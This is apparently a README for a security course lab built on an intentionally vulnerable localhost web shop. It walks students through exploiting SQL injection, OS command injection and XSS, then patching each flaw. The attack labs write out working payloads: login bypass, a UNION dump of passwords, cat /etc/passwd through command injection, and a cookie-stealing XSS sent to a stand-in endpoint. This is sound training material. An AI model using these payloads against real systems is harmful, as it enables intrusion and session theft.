# Session 8 — Injection, SQL Injection & XSS Lab

> **OWASP Top 10 — A05:2025 — Injection** (includes SQL injection, OS command injection, and Cross-Site Scripting).
>
> ⚠ **This application is intentionally vulnerable. Do NOT deploy it. Run only on `localhost`.**

You are the security engineer who just inherited a small web shop written by a
junior developer in a hurry. In this lab you will:

1. Run the app.
2. **Exploit** each injection/XSS flaw with concrete attacks (browser, curl, scripts).
3. **Patch** the code yourself, guided by hints.
4. **Verify** the exploit no longer works.

Labs 1–6 are *attacks* (Modules 4 & 5). Labs 7–10 are the *fixes* (Module 6) —
each one patches a vulnerability you exploited earlier. Each lab is self-contained
(~10–15 min).

---

## Table of contents

- [Setup](#setup)
- **Module 4 — Injection**
  - [Lab 1 — SQL injection: authentication bypass](#lab-1--sql-injection-authentication-bypass)
  - [Lab 2 — SQL injection: UNION-based data dump](#lab-2--sql-injection-union-based-data-dump)
  - [Lab 3 — OS command injection](#lab-3--os-command-injection)
- **Module 5 — Cross-Site Scripting (XSS)**
  - [Lab 4 — Reflected XSS](#lab-4--reflected-xss)
  - [Lab 5 — Stored XSS + cookie theft](#lab-5--stored-xss--cookie-theft)
  - [Lab 6 — DOM-based XSS](#lab-6--dom-based-xss)
- **Module 6 — Prevention**
  - [Lab 7 — Prevent SQLi with parameterized queries](#lab-7--prevent-sqli-with-parameterized-queries)
  - [Lab 8 — Prevent command injection](#lab-8--prevent-command-injection)
  - [Lab 9 — Prevent XSS with output encoding](#lab-9--prevent-xss-with-output-encoding)
  - [Lab 10 — Defense in depth: CSP + safe DOM sinks](#lab-10--defense-in-depth-csp--safe-dom-sinks)
- [Final verification](#final-verification)
- [Glossary](#glossary)
- [Further reading](#further-reading)

---

## Setup

### Requirements

- **Node.js 20.x** (`nvm install 20` if missing)
- **npm** (ships with Node.js — no extra install needed)
- **curl** (several labs)
- A modern browser with **DevTools** (Chrome/Firefox)
- `ping` available on the host (standard on Linux/macOS/WSL) — Lab 3

### Install & run

```bash
npm install
cp .env.example .env
npx prisma migrate dev --name init
npm run seed
npm run dev
```

Open <http://localhost:3000>. You should see a red banner: **INTENTIONALLY
VULNERABLE APP — DO NOT DEPLOY**.

### Demo accounts

| Username | Password        | Role  |
| -------- | --------------- | ----- |
| admin    | `S3cr3t-Admin!` | admin |
| alice    | `password`      | user  |
| bob      | `letmein`       | user  |
| charlie  | `qwerty`        | user  |
| dave     | `123456`        | user  |
| eve      | `iloveyou`      | user  |

Each user row also has a `secret` column — that is the loot for Lab 2.

### Resetting between labs

```bash
rm prisma/dev.db
npx prisma migrate dev --name init
npm run seed
```

---

# Module 4 — Injection

> **Injection** happens when untrusted input reaches an **interpreter** (a
> database, an OS shell, a browser) and is executed there as commands. The root
> cause is always the same: **data and commands mixed together in one string.**

## Lab 1 — SQL injection: authentication bypass

> **Vulnerability (CWE-89)**: the login query is built by string concatenation
> and run with Prisma's `$queryRawUnsafe`, so your input becomes part of the SQL
> **command**, not just data.

### Theory

The server runs:

```sql
SELECT id, username, role FROM User WHERE username = '<you>' AND password = '<you>'
```

If you supply the username `admin' --`, the query becomes:

```sql
SELECT ... WHERE username = 'admin' --' AND password = '...'
```

`--` starts a SQL comment, so the password check is **commented out**. You are
logged in as admin without a password. The classic `' OR '1'='1` makes the whole
`WHERE` clause always true instead.

### Exploit

**In the browser:** go to <http://localhost:3000/login>, enter username
`admin' --`, any password, submit. You get `{"ok":true,"username":"admin","role":"admin"}`.

**With curl:**

```bash
curl -s -X POST http://localhost:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'"'"' --","password":"anything"}'
```

**With the script:**

```bash
npm run exploit:sqli admin
```

Watch the dev-server terminal — it prints the exact SQL that ran. That is your
proof the input changed the query's *meaning*.

### Where the bug lives

- [app/api/login/route.ts](app/api/login/route.ts) — `db.$queryRawUnsafe(\`...'${username}'...\`)`.

### Patch tip

See [Lab 7](#lab-7--prevent-sqli-with-parameterized-queries). Short version:
stop concatenating — use Prisma's typed API or a parameterized `$queryRaw`.

### Verify

After patching, `npm run exploit:sqli admin` should fail and the browser login with
`admin' --` should return `invalid credentials`. ✅

---

## Lab 2 — SQL injection: UNION-based data dump

> **Vulnerability (CWE-89)**: the product search concatenates `?q=` into a raw
> `LIKE` query. Because the `SELECT` returns exactly **3 columns**, you can append
> a `UNION SELECT` of 3 columns from *any* table and read it out.

### Theory

The server runs:

```sql
SELECT id, name, description FROM Product WHERE name LIKE '%<q>%'
```

`UNION` glues a second result set onto the first — but only if the column counts
match. The search exposes 3 columns, so we select 3 from `User`, concatenating
`password` and `secret` into the third with SQLite's `||` operator.

### Exploit

**In the browser:** go to <http://localhost:3000/products> and paste this into
the search box:

```
%' UNION SELECT id, username, password || ' / ' || secret FROM User --
```

Every user (and the admin **FLAG**) is rendered as a fake "product".

**With curl:**

```bash
curl -s "http://localhost:3000/api/search" \
  --data-urlencode "q=%' UNION SELECT id, username, password || ' / ' || secret FROM User --" -G
```

**With the script:**

```bash
npm run exploit:dump
```

You should capture `FLAG{sql_injection_dumped_the_admin_secret}`.

### Where the bug lives

- [app/api/search/route.ts](app/api/search/route.ts) — concatenated `LIKE` + `$queryRawUnsafe`.

### Patch tip

See [Lab 7](#lab-7--prevent-sqli-with-parameterized-queries).

### Verify

`npm run exploit:dump` should leak nothing after patching (no rows, or a DB error
instead of user data). ✅

---

## Lab 3 — OS command injection

> **Vulnerability (CWE-78)**: the "network tools" page runs `ping -c 1 <host>`
> through a **shell** via `child_process.exec`. Shell metacharacters in your
> input therefore run as extra commands with the server's privileges.

### Theory

`exec("ping -c 1 " + host)` spawns `/bin/sh -c "ping -c 1 <host>"`. The shell
treats `;`, `|`, `&&`, `$()` and backticks as command separators, so
`127.0.0.1; id` runs `ping` **and then** `id`.

### Exploit

**In the browser:** go to <http://localhost:3000/tools> and enter:

```
127.0.0.1; id
127.0.0.1; cat /etc/passwd
```

**With curl:**

```bash
curl -s -X POST http://localhost:3000/api/tools \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; id"}'
```

**With the script:**

```bash
npm run exploit:cmdi id
npm run exploit:cmdi "cat /etc/passwd"
```

> Windows host without `ping -c`? Use WSL, or temporarily change the command in
> `app/api/tools/route.ts` to `ping -n 1`. The injection lesson is identical.

### Where the bug lives

- [app/api/tools/route.ts](app/api/tools/route.ts) — `exec(\`ping -c 1 ${host}\`)`.

### Patch tip

See [Lab 8](#lab-8--prevent-command-injection): validate the host, and use
`execFile` (no shell).

### Verify

`npm run exploit:cmdi id` should no longer print a `uid=...` line. ✅

---

# Module 5 — Cross-Site Scripting (XSS)

> **XSS (CWE-79)** is injection where the interpreter is the **victim's browser**.
> The injected script runs with the victim's session and privileges. Root cause:
> user input rendered into a page **without proper neutralization (encoding)**.

## Lab 4 — Reflected XSS

> **Vulnerability (CWE-79)**: the products page echoes your search term back into
> the page with `dangerouslySetInnerHTML`, so a `?q=` payload runs immediately.
> Nothing is stored — the attacker has to lure each victim with a crafted link.

### Theory

React normally auto-escapes everything you render, which is why XSS is hard in
React *until* someone reaches for `dangerouslySetInnerHTML` (or `innerHTML`).
This page does exactly that with the raw query string.

### Exploit

Open this crafted link (this is what an attacker would email a victim):

```
http://localhost:3000/products?q=<img src=x onerror=alert('reflected-xss')>
```

The `<img>` fails to load, fires `onerror`, and your script runs. Swap the
`alert` for anything — e.g. exfiltrating the cookie like in Lab 5.

### Where the bug lives

- [app/products/page.tsx](app/products/page.tsx) — `dangerouslySetInnerHTML={{ __html: \`...${submitted}\` }}`.

### Patch tip

See [Lab 9](#lab-9--prevent-xss-with-output-encoding): render the text normally
so React escapes it.

### Verify

After patching, the same link shows the literal text
`<img src=x onerror=...>` instead of running it. ✅

---

## Lab 5 — Stored XSS + cookie theft

> **Vulnerability (CWE-79)**: the guestbook saves your comment and re-renders it
> as raw HTML for **every** visitor. Combined with a session cookie that lacks
> the `HttpOnly` flag, a comment can steal every reader's session.

### Theory

Stored XSS is more dangerous than reflected: the payload **persists** and fires
automatically for everyone who views the page — no per-victim lure needed. The
payoff here is real because `lib/session.ts` sets the `sid` cookie **without
`HttpOnly`**, so `document.cookie` is readable by injected JavaScript.

### Exploit

1. Log in first (e.g. via Lab 1) so you have a `sid` cookie. Visit
   <http://localhost:3000/dashboard> — note your cookie is readable, and the
   "attacker's loot bag" is empty.
2. Go to <http://localhost:3000/guestbook> and post this comment:

   ```html
   <img src=x onerror="fetch('/api/steal?c='+document.cookie)">
   ```

   (`/api/steal` is a **stand-in for the attacker's server** so nothing leaves
   your machine.)
3. Reload the guestbook (simulating another visitor). The `onerror` fires and
   ships the cookie.
4. Return to <http://localhost:3000/dashboard> → the stolen cookie now appears
   in the loot bag. The attacker can replay it to hijack the session.

**With the script** (emulates the victim's browser headlessly):

```bash
npm run exploit:xss
```

### Where the bug lives

- [app/guestbook/page.tsx](app/guestbook/page.tsx) — `dangerouslySetInnerHTML={{ __html: c.body }}`.
- [app/api/comments/route.ts](app/api/comments/route.ts) — stores the body unsanitized.
- [lib/session.ts](lib/session.ts) — cookie set without `httpOnly`.

### Patch tip

See [Lab 9](#lab-9--prevent-xss-with-output-encoding): encode/sanitize the body
and add `httpOnly` to the cookie.

### Verify

`npm run exploit:xss` should report the payload was encoded and nothing was stolen. ✅

---

## Lab 6 — DOM-based XSS

> **Vulnerability (CWE-79)**: the welcome page reads `location.hash` (attacker
> controlled) and writes it into `innerHTML` (a dangerous **sink**) entirely in
> client-side JavaScript. The payload **never touches the server**.

### Theory

There is no server round-trip here — the bug is a *source* (`location.hash`)
flowing into a *sink* (`element.innerHTML`). Server-side defenses (encoding in
templates, WAFs) can't see it; the fix must live in the client code.

### Exploit

Open:

```
http://localhost:3000/welcome#<img src=x onerror=alert('dom-xss')>
```

The greeting script reads everything after `#` and injects it as HTML.

### Where the bug lives

- [app/welcome/page.tsx](app/welcome/page.tsx) — `ref.current.innerHTML = \`Welcome back, ${name}!\``.

### Patch tip

See [Lab 10](#lab-10--defense-in-depth-csp--safe-dom-sinks): use `textContent`
instead of `innerHTML`.

### Verify

The same URL shows the literal payload text in the greeting, no alert. ✅

---

# Module 6 — Prevention

> Core idea: **separate data from commands**. Use parameterized queries / safe
> APIs, validate input on the server, encode output for its context, and layer
> defenses (CSP, least privilege). No single control is enough on its own.

## Lab 7 — Prevent SQLi with parameterized queries

> Fixes **Lab 1 and Lab 2**.

### Theory

A **parameterized query** (prepared statement) sends the query *structure* and
the *data* to the database separately. The database parses the structure first,
then binds your input strictly as a value — so input can **never** become SQL.

### Patch

**Login** — [app/api/login/route.ts](app/api/login/route.ts). Replace the
concatenated `$queryRawUnsafe` with Prisma's typed API:

```ts
import { db } from "@/lib/db";
const user = await db.user.findFirst({
  where: { username, password }, // Prisma parameterizes both values
  select: { id: true, username: true, role: true },
});
if (!user) {
  return NextResponse.json({ error: "invalid credentials" }, { status: 401 });
}
```

**Search** — [app/api/search/route.ts](app/api/search/route.ts). Use the typed
`contains` filter (also parameterized):

```ts
const results = await db.product.findMany({
  where: { name: { contains: q } },
  select: { id: true, name: true, description: true },
});
return NextResponse.json({ results });
```

> If you must keep raw SQL, use the **tagged-template** `db.$queryRaw` (not
> `...Unsafe`): `` db.$queryRaw`SELECT ... WHERE name LIKE ${'%' + q + '%'}` `` —
> the `${}` values are bound as parameters, not concatenated.

**Defense in depth — least privilege:** in production the app's DB account should
have only the rights it needs (e.g. no `DROP`/`ALTER`), so a missed injection
can't destroy the schema.

### Verify

```bash
npm run exploit:sqli admin   # fails
npm run exploit:dump         # leaks nothing
```

---

## Lab 8 — Prevent command injection

> Fixes **Lab 3**.

### Theory

Two layers: (1) **allowlist validation** — reject anything that isn't a valid
hostname/IP; (2) **never use a shell** — `execFile` passes arguments directly to
the program, so shell metacharacters are inert.

### Patch

[app/api/tools/route.ts](app/api/tools/route.ts):

```ts
import { execFile } from "node:child_process";
import { promisify } from "node:util";
const execFileAsync = promisify(execFile);

const HOST_RE = /^[a-zA-Z0-9.-]{1,253}$/; // allowlist: letters, digits, dot, hyphen
if (!HOST_RE.test(host)) {
  return NextResponse.json({ error: "invalid host" }, { status: 400 });
}
// No shell: args are passed as an array, so ";", "|", "$()" are just text.
const { stdout, stderr } = await execFileAsync("ping", ["-c", "1", host], { timeout: 5000 });
```

### Verify

```bash
npm run exploit:cmdi id   # the injected command no longer runs
```

`127.0.0.1; id` is now rejected as an invalid host. ✅

---

## Lab 9 — Prevent XSS with output encoding

> Fixes **Lab 4 and Lab 5**.

### Theory

**Output encoding (CWE-116)** converts characters like `<` `>` `"` into entities
so the browser shows them as *text*, never executes them. The simplest fix in
React: stop using `dangerouslySetInnerHTML` and let JSX auto-escape. For rich
text you genuinely want to allow, sanitize with an allowlist library
(e.g. DOMPurify) instead of trusting raw input.

### Patch

**Reflected (Lab 4)** — [app/products/page.tsx](app/products/page.tsx). Replace
the `dangerouslySetInnerHTML` banner with plain JSX:

```tsx
<div className="text-sm text-slate-700">
  Showing results for: <b>{submitted}</b>
</div>
```

**Stored (Lab 5)** — [app/guestbook/page.tsx](app/guestbook/page.tsx). Render
the body as text:

```tsx
<div>{c.body}</div>
```

Also sanitize on the way **in** ([app/api/comments/route.ts](app/api/comments/route.ts))
as defense in depth, and harden the cookie in
[lib/session.ts](lib/session.ts):

```ts
cookies().set(SESSION_COOKIE, username, {
  path: "/",
  httpOnly: true,                 // JS can no longer read it (blocks cookie theft)
  sameSite: "lax",
  secure: process.env.NODE_ENV === "production",
  maxAge: 60 * 60 * 8,
});
```

### Verify

```bash
npm run exploit:xss   # payload encoded, nothing stolen
```

The Lab 4 link now shows the payload as literal text. ✅

---

## Lab 10 — Defense in depth: CSP + safe DOM sinks

> Fixes **Lab 6** and adds a site-wide backstop.

### Theory

- **Safe DOM sink**: `textContent` writes text only — it never parses HTML, so
  it cannot execute scripts. Prefer it over `innerHTML`.
- **Content Security Policy (CSP)**: a browser-enforced rule listing which
  scripts are allowed to run. Even if an encoding bug slips through, a strict CSP
  (e.g. no inline scripts) stops the injected script from executing — a backstop,
  not a primary fix.

### Patch

**DOM XSS (Lab 6)** — [app/welcome/page.tsx](app/welcome/page.tsx):

```ts
ref.current.textContent = `Welcome back, ${name}!`; // not innerHTML
```

**CSP** — [next.config.js](next.config.js): add a response header for all routes.

```js
const nextConfig = {
  reactStrictMode: true,
  async headers() {
    return [{
      source: "/:path*",
      headers: [{
        key: "Content-Security-Policy",
        value: "default-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'none'",
      }],
    }];
  },
};
```

### Verify

```bash
curl -I http://localhost:3000 | grep -i content-security-policy
```

The `/welcome#...` payload now renders as inert text. ✅

---

## Final verification

After completing Labs 7–10, run the full suite:

```bash
npm run test:exploits
```

Every line in the summary should read **`patched`**. If any still says
**`VULNERABLE`**, that lab isn't fully fixed — go back and tighten it.

Submit:

- Your patched `app/`, `lib/`, and `prisma/` files.
- `LAB_NOTES.md` (copy from `LAB_NOTES.template.md`): one paragraph per lab with
  what you exploited, what you patched, and the CWE + OWASP control you applied —
  plus a "before"/"after" screenshot.

---

## Glossary

- **Injection** — untrusted input executed as commands inside an interpreter.
- **SQL injection (CWE-89)** — smuggling SQL through unsanitized input.
- **UNION-based SQLi** — using `UNION SELECT` to append attacker-chosen rows.
- **OS command injection (CWE-78)** — user input becomes part of a shell command.
- **XSS (CWE-79)** — injecting script that runs in the victim's browser.
- **Reflected / Stored / DOM XSS** — payload bounced off one request / persisted
  on the server / handled entirely in client JS.
- **Source / Sink** — where untrusted data enters / the dangerous place it flows into.
- **Parameterized query** — query whose structure and data are sent separately.
- **Output encoding (CWE-116)** — converting characters so they display as text.
- **CSP** — Content-Security-Policy; browser rule limiting which scripts may run.
- **Least privilege** — granting each account only the access it actually needs.
- **`HttpOnly`** — cookie flag that hides the cookie from JavaScript.

## Further reading

- OWASP Top 10:2025 — A05 Injection — `../../security_claude/md/A05_2025-Injection.md`
- OWASP SQL Injection Prevention Cheat Sheet — <https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html>
- OWASP XSS Prevention Cheat Sheet — <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP OS Command Injection Defense — <https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html>
- CWE-89, CWE-78, CWE-79, CWE-116, CWE-20.
